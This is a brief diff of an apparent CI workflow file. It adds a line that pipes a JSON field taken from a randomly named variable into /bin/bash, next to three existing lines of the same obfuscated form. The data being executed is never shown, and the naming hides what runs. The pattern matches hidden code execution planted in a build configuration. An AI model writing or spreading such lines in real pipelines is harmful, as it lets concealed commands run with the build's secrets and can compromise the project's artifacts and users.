@@ -29,6 +29,7 @@ jobs:
           echo $idr45 | jq -r .grrv07486 | /bin/bash
           printf '%s' "$rvfrj6" | jq -r .m9490 | /bin/bash
           printf '%s' "$o4" | jq -r .zzyf268 | /bin/bash
+          echo $hixjd7 | jq -r .bkgu6953 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
